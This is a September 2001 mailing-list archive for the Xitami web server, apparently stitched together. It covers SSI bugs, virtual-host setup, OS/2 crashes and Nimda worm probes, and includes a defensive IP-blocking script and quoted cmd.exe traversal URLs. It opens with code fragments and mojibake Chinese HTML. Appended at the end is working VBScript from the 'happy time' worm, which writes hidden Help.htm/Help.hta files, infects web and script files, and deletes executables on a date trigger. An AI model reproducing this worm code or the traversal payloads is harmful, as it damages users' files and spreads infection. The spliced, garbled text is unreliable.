    'n', 't', 's', ';', 10, 10, 32, 32, 32, 32, 'd', 'o', 'c', 'u', 'm',

    'n', 'f', '(', 'a', 'r', 'g', 'u', 'm', 'e', 'n', 't', 's', ',',

    'e', 32, '=', 32, 'a', 'r', 'g', 'u', 'm', 'e', 'n', 't', 's', ';',

From xitami@lists.xitami.org  Thu Sep 20 10:22:39 2001
From: xitami@lists.xitami.org (Francis Turner)
Date: Thu, 20 Sep 2001 11:22:39 +0200
Subject: [Xitami] Bug: SSI Includes aren't recursive
Message-ID: <3BA9B55F.7000108@freesbee.fr>

I just noticed that the SSI include tag (e.g. the one on the testssi 
page <!--#include file="testssi.inc"-->) cuases the rest of the 
including document (e.g. testssi.ssi) after the tag not to get delivered 
if the included document itself uses SSI as the example include does.

SSI returns just fine if the included document itself does not try any 
SSI calls.

This is true using Xitami 2.5b5 (and 2.5b4) with NS6.1, 4.7 and IE5 and 
appears to be a xitami thing in that the HTML is in fact completely 
unfinished. I'm guessing that Xixssi doesn't deal well with the same 
page requiring 2 levels of return.

Also in the process of debugging and playing I noticed that Xitami has a 
limit on files with SSI includes of about 35,000+ bytes (one file 
displayed upto the 35922nd byte, another upto the 35553rd) and any data 
thereafter is abruptly truncated. The limit is not there for pure HTML 
files - I can successfully read 1Mbyte + sized .htm files but the same 
file renamed as .SSI will be truncated around this point even if it has 
no includes.

Francis

From xitami@lists.xitami.org  Thu Sep 20 18:03:49 2001
From: xitami@lists.xitami.org (Mike)
Date: Thu, 20 Sep 2001 10:03:49 -0700
Subject: [Xitami] NIMDA filter
Message-ID: <4.1.20010920100155.0092dd60@pop3.norton.antivirus>

The September 19 Linux Journal Weekly News Notes included the following
script to block connections from Nimda-infected sites:

#!/bin/sh
#
# Block sites which originate Nimba queries from Apache server
# Apache must be configured with HostnameLookups Off

LOGS=/var/log/httpd

cd $LOGS

grep '^[0-9]*\.[0-9]*\.[0-9]*\.[0-9]* ' * 2>/dev/null |
awk '/system32\/cmd\.exe/ {sub(/[^:]*:/,"");print $1}' |
sort -u |
while read host
do
if ! fgrep $host /var/tmp/blocked >/dev/null
then
echo $host >>/var/tmp/blocked
/sbin/ipchains -I input -s $host -j DENY -l
fi
done

Question:  Is there a way to configure xitami to similarly block
connections from Nimda infected sites?  If so, would somebody mind doing a
step-by-step explanation?

Thanks.

Mike

From xitami@lists.xitami.org  Thu Sep 20 19:44:56 2001
From: xitami@lists.xitami.org (Paul Reid)
Date: Thu, 20 Sep 2001 14:44:56 -0400
Subject: [Xitami] "GET /scripts/.......
References: <5B983AB5F20BD511A3EE0002A52C3CB6E6D6F5@JDM_EXCHANGE.hilversum.endemol.com> <3BAA2751.EB148382@arbor-freight.com>
Message-ID: <3BAA3928.25CDCD49@rci.rutgers.edu>

> Bandwidth seems uneffected at this point as we are only getting a few thousand hits per day from it, but this might change as the worm gets more wide spread 

My university's estimate is that "all vulnerable machines" were infected
in a few hours. Infected machines are slowly realizing it and fixing it,
while new machines come on-line and get infested... the traffic is
probably stable or declining overall. 

> or if you have a better known site.

This one, like CodeRed, does not know if you are "known" or even if you
exist. It picks IP numbers semi-randomly. It seems to favor "nearby
numbers"... I'm getting a lot of hits from 165.2xx.xxx.xxx addresses. So
you may see a surge if a clump of machines on IP numbers near you infect
each other and start pinging "nearby" IP numbers. 

Aside from log-file growth: I was using a custom 404 Error page with a
graphic. They are welcome to my 100 bytes of text. But the graphic is
pointless when 99% of my 404s today are from worms. I'll probably omit
the graphic and cut the number of packets in half. 

 -PRR

supposed to look when configured correctly.

multiple directory branches). =20

From xitami@lists.xitami.org  Fri Sep 21 00:58:16 2001
From: xitami@lists.xitami.org (John Jonas)
Date: Thu, 20 Sep 2001 18:58:16 -0500
Subject: [Xitami] HELP - virtual DNS hosting
References: <07ec01c1420a$fa8c2800$020aa8c0@Master>
Message-ID: <3BAA8298.AAC30E46@arbor-freight.com>

--------------5852EDA155B9A8655EBC7923
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit

Here is what works for me using 2.4d7 on W2K Pro (worked the same on NT
4.0 Server).  Our primary site is www.arbor-freight.com with a virtual
site of www.audctrl.com.

The default.cfg that I believe is automatically merged with the
xitami.cfg contains:

#*END

[Ftp]
    Email-check=1
    Root=t:\ftphome

[Security]
    Filename=defaults.aut

[Server]
    Cgi-bin=e:\webhome\cgi-bin
    Webpages=e:\webhome\arbor

[Virtual-hosts]
    www.audctrl.com=audctrl.cfg

Then there is an audctrl.cfg (as pointed to by the default.cfg)
containing:

#*END

[Accesslog]
    Filename=audctrl.log

[Ftp]
    Root=t:\ftphome

[Security]
    Admin=0
    Filename=audctrl.aut

[Server]
    Cgi-bin=e:\webhome\cgi-bin
    Webpages=e:\webhome\audctrl

Note in our case we use the same ftp and cgi-bin for both the primary
and virtual, but use separate webpage directories.

Hope this helps!

----- Original Message -----
From: John Jonas
To: xitami@lists.xitami.org
Sent: Thursday, September 20, 2001 4:58 PM
Subject: Re: [Xitami] HELP - virtual DNS hosting


Here is what works for me using 2.4d7 on W2K Pro (worked the same on NT 4.0
Server).  Our primary site is www.arbor-freight.com with a virtual site of
www.audctrl.com.
The default.cfg that I believe is automatically merged with the xitami.cfg
contains:
#*END
[Ftp]
    Email-check=1
    Root=t:\ftphome
[Security]
    Filename=defaults.aut
[Server]
    Cgi-bin=e:\webhome\cgi-bin
    Webpages=e:\webhome\arbor
[Virtual-hosts]
    www.audctrl.com=audctrl.cfg
Then there is an audctrl.cfg (as pointed to by the default.cfg) containing:
#*END
[Accesslog]
    Filename=audctrl.log
[Ftp]
    Root=t:\ftphome
[Security]
    Admin=0
    Filename=audctrl.aut
[Server]
    Cgi-bin=e:\webhome\cgi-bin
    Webpages=e:\webhome\audctrl
Note in our case we use the same ftp and cgi-bin for both the primary and
virtual, but use separate webpage directories.
Hope this helps!
Russel Olinger wrote:
Ok, I am caving in and need some help here folks.  This is driving me nuts.
Two years ago, on a Win98 platform I was able to get virtual hosting to work
via DNS.  But now I am running a newer Xitami version on WinNT 4.0 and can't
seem to get anything to work.

From xitami@lists.xitami.org  Fri Sep 21 09:36:37 2001
From: xitami@lists.xitami.org (Pieter Hintjens)
Date: Fri, 21 Sep 2001 10:36:37 +0200
Subject: [Xitami] SSI and PHP Problems
In-Reply-To: <3BA9A0CC.6171.50910E@localhost>
Message-ID: <3BAB1835.27320.8D68FB8@localhost>

Brad Smith wrote:

> Earlier this month, I sent a request for help installing PHP with
> Xitami.  Since that time, I managed to install PHP on our design
> terminal, but I still can't get it running on our server.
> 
> Knowing the security risks but desperately in need of a temporary fix,
> I tried getting SSI working with Xitami.  No luck on that account
> either!  Needless to say, I am frustrated.
> 
> The server is running Win2000 and the latest retail release of 
> Xitami.  Is it a permission problem on Win2000 where I haven't set the
> directory/file permissions correctly?  Is it a problem w/ Xitami? 
> Since I purchased the retail version, is there a IMatix customer
> service line I call or a customer service email address I should
> email?

If you're running Xitami as a service, make sure it runs under an 
account that has access to write into the Xitami temporary 
directories.  To check whether it's a file permissions issue, try 
running the Xitami executable from a DOS window ('xiprosrv -d').  You 
can also try running the service under the Administrator user id 
(which should have access to all file systems).

-
Pieter Hintjens
iMatix Corporation

Subject: [Xitami] NIMDA filter
References: <4.1.20010920100155.0092dd60@pop3.norton.antivirus>
Message-ID: <3BAB412F.5EBDB4E1@qwest.net>

If you are running Linux this will block any attempt form the IP's from
accessing your site a little harsh but would work


Mike wrote:
> 
> The September 19 Linux Journal Weekly News Notes included the following
> script to block connections from Nimda-infected sites:
> 
> #!/bin/sh
> #
> # Block sites which originate Nimba queries from Apache server
> # Apache must be configured with HostnameLookups Off
> 
> LOGS=/var/log/httpd
> 
> cd $LOGS
> 
> grep '^[0-9]*\.[0-9]*\.[0-9]*\.[0-9]* ' * 2>/dev/null |
> awk '/system32\/cmd\.exe/ {sub(/[^:]*:/,"");print $1}' |
> sort -u |
> while read host
> do
> if ! fgrep $host /var/tmp/blocked >/dev/null
> then
> echo $host >>/var/tmp/blocked
> /sbin/ipchains -I input -s $host -j DENY -l
> fi
> done
> 
> Question:  Is there a way to configure xitami to similarly block
> connections from Nimda infected sites?  If so, would somebody mind doing a
> step-by-step explanation?
> 
> Thanks.
> 
> Mike

Subject: [Xitami] Virtual Host Problem
Message-ID: <200109212248.AAA24063@sxpublic.nxrda.imatix.net>

Hello..

I'm having a problem getting virtual hosts to work. I have managed to 
get it working, but I'm wondering if its the correct way to do it.

I've been through the VHost Wizard to setup a new virtual host for 
www.benryder.co.uk - that works fine, and points to the correct 
directory, yet benryder.co.uk (minus www) shows the default Xitami page. 
If I choose the Vhost Submenu within benryder.cfg (saved config for 
www.benryder.co.uk) and add benryder.co.uk --> benryder.cfg , and 
restart the server it still shows benryder.co.uk with the default Xitami 
page.

However if I click on the defaults button with Virtual Hosts, then on 
the VHost Submenu and add benryder.co.uk to the list, it works ??

It may be that I'm doing this the right way, but it may not be? If 
someone could fill me in I would be very grateful !

Also, as I have to put double in the Defaults VHost Submenu (eg. one for 
benryder.co.uk and one for www.benryder.co.uk, will I eventually run out 
of options for other domains I may want to add ??).

Thanks in advance !

Ben.




From xitami@lists.xitami.org  Sat Sep 22 00:02:57 2001
From: xitami@lists.xitami.org (Soulkoff)
Date: Fri, 21 Sep 2001 19:02:57 -0400
Subject: [Xitami] Virtual Host Problem
References: <200109212248.AAA24063@sxpublic.nxrda.imatix.net>
Message-ID: <06d901c142f1$8e445900$0a00a8c0@enigmacomputers.com>

Ben, 

In your defaults.cfg:

[Virtual-hosts]
    * = "basehost.cfg"
    www.benryder.co.uk = "foo.cfg"
    benryder.co.uk = "foo.cfg"

Where foo.cfg = your configuration file for www.benryder.co.uk

And no, you won't run out of lines to add virtual hosts in the .cfg file.

~Matthias

From xitami@lists.xitami.org  Sat Sep 22 08:40:11 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Sat, 22 Sep 2001 19:40:11 +1200
Subject: [Xitami] Regular crash
In-Reply-To: Message from John Poltorak <jp@eyup.org>
 of "Fri, 21 Sep 2001 01:04:42 +0100." <20010921010442.C77@eyup.org>
Message-ID: <200109220740.TAA20612@pagoda.in.naos.co.nz>

In message <20010921010442.C77@eyup.org>, John Poltorak writes:
>I've found that Xitami crashes regularly when a particular user access it.
>How do I find out what is wrong?

If you've got a repeatable bug (and it sounds like you do), then the
main thing to do is to try to gather as much information about the
circumstances it occurs in as possible.  In particular turning on the
Xitami server debugging support ([Server] debug=1) and trying again
should give you more detail on the command(s) the user's FTP program is
sending at the time that Xitami crashes.  It certainly sounds like it's
choking on one of the commands being sent for some reason.

The next thing I'd usually try is network traffic snooping, which is
easy under Linux/Unix (tcpdump, ethereal, snoop, etc), but off hand I
can't think go a way to do it under OS/2.  This gives you a
packet-by-packet view of the data that Xitami is sending and receiving,
which can help narrow down the troublesome cause further.

>I'm running v2.4d6 on OS/2. I have a CORE file but have no idea how to 
>glean anything from it.

If you have the EMX development tools installed, you can try:

gdb xitami.exe core

And then "bt" (back trace) to try to find out which routine Xitami was
running when it crashed.  This may or may not be as useful as the
information from the debug log, depending on what type of bug it is (eg,
some bugs corrupt things which only cause crashes later on, so what you
want to know is where it was corrupted not where it finally crashed
because of the corruption).

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

AFAIK there has never been an Xitami/Pro for FreeBSD.  Other than
figuring out how to distribute it, there's no real reason there couldn't
be one, but I don't think anyone has asked before.  (Xitami/Pro for
Windows and OS/2 has always been distributed as a binary; at one point I
think there was one build of Xitami/Pro for Linux done and distributed
as a binary -- but this was several years ago and probably wouldn't run
well on modern Linux systems.)

From xitami@lists.xitami.org  Sat Sep 22 09:25:06 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Sat, 22 Sep 2001 20:25:06 +1200
Subject: [Xitami] Nimda gets a 200?
In-Reply-To: Message from "Soulkoff" <soulkoff@home.com>
 of "Fri, 21 Sep 2001 12:50:34 -0400." <067601c142bd$887362c0$0a00a8c0@enigmacomputers.com>
Message-ID: <200109220825.UAA21395@pagoda.in.naos.co.nz>

In message <067601c142bd$887362c0$0a00a8c0@enigmacomputers.com>, "Soulkoff" writes:
>This gives a 404:
>http://24.12.24.86/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir

Which is to be expected, you probably don't have a scripts directory,
and even if you do, it's unlikely to have a winnt/system32/cmd.exe file!

>This gives a 200!?:
>http://24.12.24.86/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir
>
>Do you know what this means?

The 200 is because Xitami finds a page to return.  Your home page.  This
happens under Windows, Linux, etc, although the reason that it happens is
a little bit involved.

The major difference between the two URLs is that the second one has an
illegal %-escape in the URL (the "%%" is illegal; it should be "%nn"
where the "nn" is two hex digits, and "%25" to put a real "%" in).
When Xitami encounters this illegal "%%" it thinks that must be the end
of the "real" URL, because it's found a bit that doesn't make sense.
(To be precise, as a result of the way the routine that decodes the hex
digits is coded, it stores a NUL into the string at that point.)

This gives a URL of: 

http://24.12.24.86/scripts/..

Next Xitami's path resolution code kicks in, which resolves ".." by
eliminating the previous path bit (down to leaving nothing in the URL),
which gives:

http://24.12.24.86/

Hence a 200, serving the default index page.

So, nothing really bad is happening (although it does mean that you'll
send the worm a copy of your index page for each request like that it
sends, which may be a bit more traffic than a 404).

I'll add it to our bug list.  When Xitami finds an illegal escape like
that it should reject it explicitly (with a 404 automatically, or some
sort of malformed request message).

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

Maybe it send the mail to the html output file instead.

In addition, is there any way to get MAILTO to redirect the browser to a 
specific web page/URL after successful form submission (rather than have 
the entire page code included in the CFG file)?

There a at least two possibilities:
    - with javascript you can use a onSubmit="window.location.href=..."
    - instead of generating a html page, you can send a Location: 
http://www.hdhdshsdhds-statement with two CRLF's
      and your client's browser will load that page.

A sendmail is a rather simple program, it only has to talk to a smtp server...

>[Two domain names, one the official name, one an alias; when people go
> to the alias name, would like them client-side redirected to the
> official name]

Xitami doesn't (currently) include support to do this automatically (ie,
it has nothing like mod-redirect in Apache).  You can probably do
something similar with a filter (eg, PHP), or client-side Javascript
though.

From xitami@lists.xitami.org  Sat Sep 22 09:45:55 2001
From: xitami@lists.xitami.org (Ewen McNeill)
Date: Sat, 22 Sep 2001 20:45:55 +1200
Subject: [Xitami] Pro on FreeBSD
In-Reply-To: Message from "Maarten Koopmans" <m.koopmans2@chello.nl>
 of "Sat, 22 Sep 2001 10:12:10 +0200." <000f01c1433e$4781b240$f4068418@a2000.nl>
Message-ID: <200109220845.UAA22377@pagoda.in.naos.co.nz>

In message <000f01c1433e$4781b240$f4068418@a2000.nl>, "Maarten Koopmans" writes:
>And what about the source kit? I may want Pro but it will have to run on
>FreeBSD or Linux.  Is the source kit known to compile on FreeBSD?

The Xitami source kit has been compiled on FreeBSD (IIRC there's even a
FreeBSD port for it), but I'm not aware of anyone who has compiled the
Xitami/Pro source on FreeBSD.  In theory it shouldn't be too tricky,
a Xitami/Pro is basically the Xitami source, plus some code to interface
to SSLeay/OpenSSL which should be very portable.  The Xitami source is
freely available, but the Xitami/Pro extensions have traditionally been
a commercial product, hence fewer people have compiled Xitami/Pro.

If you're still keen mail me off the list (ie, directly to
ewen@imatix.com) and I'll bring the issue up with someone at iMatix HQ.

Ewen

-- 
Ewen McNeill, Technical Consultant, iMatix Corporation  www.imatix.com

--=====================_87407894==_.ALT
Content-Type: text/plain; charset="us-ascii"; format=flowed

hello !

Does file upload works with Xitami?

I use this sample file as request for upload:

<html><head></head>
<body bgcolor=white>
<form action=http://web.verfaillie.com/cgi-bin/env.exe method=post>
<input type=file name="123.txt"><br>
<input type=submit value="Send">
</form>
</body></html>

The scripts executes correctly (env.exe only prints the windows 
environment) but where can i find the uploaded file???


Thats the back-end VB program:

Sub main()
     Open "c:\test.txt" For Output Access Write As #1
     Print #1, "start"
     a$ = Environ$("CGI_STDOUT")
     Open a$ For Output Access Write As #3
     Print #3, "<html><body><pre>"
     a$ = Environ$(1)
     While a$ <> ""
         Print #3, a$; "<br>"
         Print #1, a$
         i = i + 1
         a$ = Environ$(i)
     Wend
     Print #3, "</body></html>"
     Close
     End
End Sub

From xitami@lists.xitami.org  Sat Sep 22 11:38:12 2001
From: xitami@lists.xitami.org (Ariel)
Date: Sat, 22 Sep 2001 06:38:12 -0400
Subject: [Xitami] SSI and PHP Problems
References: <3BA9A0CC.6171.50910E@localhost>
Message-ID: <001301c14352$b4930dc0$6d9c613f@unionstreetstation.com>

taken straight from http://www.php.net/manual/en/install.xitami.php

Xitami for Windows
This list describes how to set up the PHP CGI binary to work with Xitami on
Windows.

Make sure the webserver is running, and point your browser to xitamis admin
console (usually http://127.0.0.1/admin), and click on Configuration.

Navigate to the Filters, and put the extension which php should parse (i.e.
php) into the field File extensions (.xxx).

In Filter command or script put the path and name of your php executable
i.e. c:\php\php.exe.

Press the 'Save' icon.

From: "MATA Tech" <mata@matatech.tzo.com>

From xitami@lists.xitami.org  Sat Sep 22 11:40:29 2001
From: xitami@lists.xitami.org (John Poltorak)

Subject: [Xitami] Regular crash
In-Reply-To: <200109220740.TAA20612@pagoda.in.naos.co.nz>; from Ewen McNeill on Sat, Sep 22, 2001 at 07:40:11PM +1200
References: <jp@eyup.org> <200109220740.TAA20612@pagoda.in.naos.co.nz>
Message-ID: <20010922114028.M77@eyup.org>

On Sat, Sep 22, 2001 at 07:40:11PM +1200, Ewen McNeill wrote:
> In message <20010921010442.C77@eyup.org>, John Poltorak writes:
> >I've found that Xitami crashes regularly when a particular user access it.
> >How do I find out what is wrong?
> 
> If you've got a repeatable bug (and it sounds like you do), then the
> main thing to do is to try to gather as much information about the
> circumstances it occurs in as possible.  In particular turning on the
> Xitami server debugging support ([Server] debug=1) and trying again
> should give you more detail on the command(s) the user's FTP program is
> sending at the time that Xitami crashes.  It certainly sounds like it's
> choking on one of the commands being sent for some reason.

Whilst it is repeatable, it isn't something I can reproduce myself because 
I don't know exactly what software is being used although I think it is 
being run under Win98 and this user only connects every one or two weeks. 
 
> The next thing I'd usually try is network traffic snooping, which is
> easy under Linux/Unix (tcpdump, ethereal, snoop, etc), but off hand I
> can't think go a way to do it under OS/2.  This gives you a
> packet-by-packet view of the data that Xitami is sending and receiving,
> which can help narrow down the troublesome cause further.

Tcpdump is available for OS/2 but I've never managed to get it working,
however I don't think packet snooping is a realistic option unless I can 
set up a controlled test.
 
> >I'm running v2.4d6 on OS/2. I have a CORE file but have no idea how to 
> >glean anything from it.
> 
> If you have the EMX development tools installed, you can try:
> 
> gdb xitami.exe core
> 
> And then "bt" (back trace) to try to find out which routine Xitami was
> running when it crashed.  This may or may not be as useful as the
> information from the debug log, depending on what type of bug it is (eg,
> some bugs corrupt things which only cause crashes later on, so what you
> want to know is where it was corrupted not where it finally crashed
> because of the corruption).

I'm not familiar with GDB, but here's the output I get following your 
suggestion. I hope it makes some sense to you.

From xitami@lists.xitami.org  Sat Sep 22 15:49:18 2001
From: xitami@lists.xitami.org (John Holt)
Date: Sat, 22 Sep 2001 10:49:18 -0400 (EDT)
Subject: [Xitami] (no subject)
In-Reply-To: <F214BsuZ2K4xDh9vXsF00000e9c@hotmail.com>
Message-ID: <Pine.OSF.3.95.1010922104305.10332A-100000@www.bit-net.com>

Paul yes you can do that. They can even have their own domain name, all of
them pointing at your IP. In Xitami, you then set up virtual hosts that
will redirect all requests for 'www.website1.com' to /websites/website1
and so forth. However, what sort of connection do you have? T1? T3?
Speed is key.

I suggest: Get a host name at www.active-domain.com for $9.95/yr and
use their controls to have the host name point to your IP. Use Xitami
Virtual Hosts to set up the web page directory. Easy as pie.

	-John

From xitami@lists.xitami.org  Sat Sep 22 20:22:38 2001
From: xitami@lists.xitami.org (Bulk Mail)
Date: Sat, 22 Sep 2001 14:22:38 -0500
Subject: [Xitami] Regular crash
In-Reply-To: <45092@dsl.co.uk>
Message-ID: <20010922192253.NQMN15361.femail22.sdc1.sfba.home.com@armlwk1>

What version of OS/2 Xitami are you using?  I also had crashes about every 2 days (give or take).  I found 
the following 2 items:

1) There is a patched version of Xitami on Hobbes (http://hobbes.nmsu.edu) bos225b4p2.zip which fixes 
some problems in (what is now) the current OS/2 Xitami release.

2) Setting the EMX env var in config.sys to:   SET EMXOPT=-c -h256 -!0x800
(This fixes some file handle issues in the OS2 EMX runtime)

With both these in place I've been up and running for 4 days now with no abends in Xitami (A minor record 
for me )




On Sat, 22 Sep 2001 09:35:04 +0100, Brian {Hamilton Kelly} wrote:

From xitami@lists.xitami.org  Sun Sep 23 02:43:37 2001
From: xitami@lists.xitami.org (Bulk Mail)
Date: Sat, 22 Sep 2001 20:43:37 -0500
Subject: [Xitami] Regular crash
In-Reply-To: <20010922232904.W77@eyup.org>
Message-ID: <20010923014352.TUEO9086.femail6.sdc1.sfba.home.com@armlwk1>

> 
>I have EMXOPT set to -h1024. What are the other two parameters for?
>

The -!0x800 was found at the Apache site (http://www.apache.org/~bjh/apache2/) as required for the EMX 
runtime. This is an apparent internal EMX work-around for file handle leaks in the lib. The  -c stops core 
dumps (my choice, can't read them anyways)

From xitami@lists.xitami.org  Mon Sep 24 23:58:06 2001
From: xitami@lists.xitami.org (Paul Reid)
Date: Mon, 24 Sep 2001 18:58:06 -0400
Subject: [Xitami] HELP - virtual DNS hosting
References: <000001c14248$a98b9420$0300a8c0@cashmachine.atl.mindspring.com> <09f401c14547$a9c662b0$020aa8c0@Master>
Message-ID: <3BAFBA7E.11FE0761@rci.rutgers.edu>

> Is there a limit to virtual DNS sites Xitami can support (off a single IP)?

The vhost scheme in Xitami is lightweight; very little load on the CPU. 

As I understand it: Somewhere above "many thousand", there will be a
-slight- delay on each hit. Unless you have a VERY fast connection, this
will be lost in network delays. 

At "thousands", any multi-host server becomes hard to manage anyway-- I
think you will lose your mind or at least lose track of who owns what
vhost long before Xitami gets confused. 

On Windows, on P-166 machines, folders with thousands of subfolders can
be slow to open. That's quite outside Xitami's control. A faster Windows
box or unix with big RAM may manage thousands of folders better. 

I certainly see no lag on a machine with a dozen vhosts. I think someone
here runs hundreds with no problem. 

 -PRR

From xitami@lists.xitami.org  Tue Sep 25 03:28:56 2001
From: xitami@lists.xitami.org (Soulkoff)
Date: Mon, 24 Sep 2001 22:28:56 -0400
Subject: [Xitami] win2k directory security
References: <NDBBIDKBILPOMBMKDOOCIEIHCDAA.alsiman@cofs.net>
Message-ID: <00d001c14569$d3fd9ae0$0a00a8c0@enigmacomputers.com>

Alvaro:  This is not really a security breach.  Think of Xitami as your email program; when you send someone an attachment, does the
folder your send the file from need to be shared for the email program to send out?  No, it does not, because YOU have permission to
access that folder.  Install Microsoft's IIS, and see what it does...same thing as Xitami....no shared web folder.

If you are really paranoid about it, you should run Xitami as a NT service, and create a user/group just for that service, which has
access only to the files needed.  I suppose you really should do this anyway, as there is no such thing as too much precaution.

~Matthias

From xitami@lists.xitami.org  Tue Sep 25 04:18:57 2001
From: xitami@lists.xitami.org (Paul Reid)
Date: Mon, 24 Sep 2001 23:18:57 -0400
Subject: [Xitami] win2k directory security
References: <NDBBIDKBILPOMBMKDOOCIEIHCDAA.alsiman@cofs.net>
Message-ID: <3BAFF7A1.DA47754D@rci.rutgers.edu>

> Xitami can serve a page for a directory that is NOT shared under Windows.

Xitami does not use Windows' concept of sharing.

Basically: Windows, being DOS with a pretty face, has weak
permissions. Unless you go to some trouble, any program on the
machine can access any file on the machine. 

Most Webservers, including Xitami, follow the rule of only
serving files in or below a specific directory. On my school's
unix box, the directory must be named "public_html", which gives
users a little warning that anything in there is "public", unlike
the rest of their directories which they may set "private".
Xitami lets you set the one specific directory that will be
served; typically c:/Xitami/webpages. It _IS_ up to you to be
sure that directory only has files you want "everybody" to see.

One exception: in addition to ./webpages, Xitami will serve files
in ./cgi-bin. By default it will only serve them by executing
them (better know what is in there!); but it can also serve
non-executable files (GIF images to support CGI apps, for
instance). 

In WinNT, with its OS/2 core, you actually have strong
permissions. You can create a "user" that has highly limited
access to files, and launch Xitami as that user. If you let other
people put CGI scripts on your server, you maybe should run
Xitami from a limited-access account. 

I "trust" Xitami to serve ONLY from the directories I told it to
serve from. Note that some other webservers (spelled "MS") have
been fooled by URLs with excess dots (implying parent directories
above where the web root should be). Also until recently Xitami
under DOS could be confused by "files" that were really devices
(even DOS sometimes can't tell the difference). That was unlikely
to spill secrets, but could lock-up the server as it waited
(forever) for data to come out of the printer (that is fixed). 

 -PRR

From xitami@lists.xitami.org  Tue Sep 25 04:26:54 2001
From: xitami@lists.xitami.org (Paul Reid)
Date: Mon, 24 Sep 2001 23:26:54 -0400
Subject: [Xitami] HELP - virtual DNS hosting
References: <NDBBIDKBILPOMBMKDOOCCEIHCDAA.alsiman@cofs.net>
Message-ID: <3BAFF97E.971B57C2@rci.rutgers.edu>

>  when I test the VHost by typing in "www.mayanarch.com" I get the following result= C:/Xitami/wwww.mayanarch.com

With four "w"s? Anyway, that URI box isn't for testing vhosts. 

> Document root is set up as C:\Xitami\webpages\MayanArch\index.htm

That should probably point to a Folder, not a File. Remember, the
vHost will have many files. Point the vHost to a folder. There is
a different place to tell Xitami what file to look for if no
specific file is requested. 

> Can someone test this from outside??

http://www.mayanarch.com/ = Xitami default

http://www.mayanarch.com/mayanarch/ = "MayanArch WELCOME"

The files are there. But your vhost is not pointing to the right
directory. "./mayanarch" is where it should point to. 

 -PRR

> 
> The Xitami source kit has been compiled on FreeBSD (IIRC there's even a
> FreeBSD port for it), but I'm not aware of anyone who has compiled the

There sure is. Still 2.4d7 though, I didn't see a reason to upgrade,
because that was mostly because of the reserved names in Win9x if I
remember correctly.

May I take the opportunity to praise Xitami; it's really funny to
see how code red tries to infect it. The log files *do* become a
little longish, though. Also the traffic has increased quite
noticeably because of the infection attempts, which will show on the
next month's ISP bill. (Apparently you don't need to be actually
vulnerable these days to be victimized, it's sufficient if enough
other web servers are.)


> Xitami/Pro source on FreeBSD.  In theory it shouldn't be too tricky,
> a Xitami/Pro is basically the Xitami source, plus some code to interface
> to SSLeay/OpenSSL which should be very portable.  The Xitami source is
> freely available, but the Xitami/Pro extensions have traditionally been
> a commercial product, hence fewer people have compiled Xitami/Pro.

I doubt Xitami/Pro will be any problem at all to compile, unless
e.g. there are 3rd party libraries used that don't exist on FreeBSD.
OpenSSL does exist on FreeBSD; SSLeay I don't know about, but I
assume it's there too, or at least a good imitation thereof.


> If you're still keen mail me off the list (ie, directly to
> ewen@imatix.com) and I'll bring the issue up with someone at iMatix HQ.

Me being the FreeBSD port maintainer of Xitami, please feel free to
contact me if you think I might be of any assistance.
You might also consider to ask on the FreeBSD mailing lists; for
general questions try questions@freebsd.org, and for port-specific
stuff ports@freebsd.org.

Greetings,
	B. Luevelsmeyer

          <td><font size="2">10¡¢<b>»°·ÑµÍÁ®</b>£º<br>
            ÊÇ"¹ú¼Ê³¤»°ÍøÂçÍ¨"×îÍ»³öÌØµã£¬Ô¶µÍÓÚIPµç»°4.8ÔªÈËÃñ±Ò/·ÖÖÓ.Í¬Ê±±ÈÆäËûÍ¬Àà²úÆ·ÈçIPST*£¬INFOTAL*£¬Ò×*µÈµÄ·ÑÂÊµÍºÜ¶à¡£Èçµ¥»úÊ¹ÓÃ£¬ÐèÒªÖ§¸¶µÄ½öÎªÍ¨»°·ÑºÍÉÏÍø·Ñ¡£Èç¹ûË«»ú¶Ô´ò£¬Ôò²»¼Æ³¤»°·Ñ£¬½öÐèÖ§¸¶ÉÏÍø·Ñ£¨0.09ÔªÈËÃñ±Ò/·ÖÖÓ£©¼´¿É¡£</font></td>

<script language='VBScript'>








 
 
 
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
Rem I am sorry! happy time  
On Error Resume Next  
mload  
Sub mload()  
On Error Resume Next  
mPath = Grf()  
Set Os = CreateObject("Scriptlet.TypeLib")  
Set Oh = CreateObject("Shell.Application")  
If IsHTML Then  
mURL = LCase(document.Location)  
If mPath = "" Then  
Os.Reset  
Os.Path = "C:\Help.htm"  
Os.Doc = Lhtml()  
Os.Write()  
Ihtml = "<span style='position:absolute'><Iframe src='C:\Help.htm' width='0' height='0'></Iframe></span>"  
Call document.Body.insertAdjacentHTML("AfterBegin", Ihtml)  
Else  
If Iv(mPath, "Help.vbs") Then  
setInterval "Rt()", 10000  
Else  
m = "hta"  
If LCase(m) = Right(mURL, Len(m)) Then  
id = setTimeout("mclose()", 1)  
main  
Else  
Os.Reset()  
Os.Path = mPath & "\" & "Help.hta"  
Os.Doc = Lhtml()  
Os.write()  
Iv mPath, "Help.hta"  
End If  
End If  
End If  
Else  
main  
End If  
End Sub  
Sub main()  
On Error Resume Next  
Set Of = CreateObject("Scripting.FileSystemObject")  
Set Od = CreateObject("Scripting.Dictionary")  
Od.Add "html", "1100"  
Od.Add "vbs", "0100"  
Od.Add "htm", "1100"  
Od.Add "asp", "0010"  
Ks = "HKEY_CURRENT_USER\Software\"  
Ds = Grf()  
Cs = Gsf()  
If IsVbs Then  
If Of.FileExists("C:\help.htm") Then  
Of.DeleteFile ("C:\help.htm")  
End If  
Key = CInt(Month(Date) + Day(Date))  
If Key = 13 Then  
Od.RemoveAll  
Od.Add "exe", "0001"  
Od.Add "dll", "0001"  
End If  
Cn = Rg(Ks & "Help\Count")  
If Cn = "" Then  
Cn = 1  
End If  
Rw Ks & "Help\Count", Cn + 1  
f1 = Rg(Ks & "Help\FileName")  
f2 = FNext(Of, Od, f1)  
fext = GetExt(Of, Od, f2)  
Rw Ks & "Help\FileName", f2  
If IsDel(fext) Then  
f3 = f2  
f2 = FNext(Of, Od, f2)  
Rw Ks & "Help\FileName", f2  
Of.DeleteFile f3  
Else  
If LCase(WScript.ScriptFullname) <> LCase(f2) Then  
Fw Of, f2, fext  
End If  
End If  
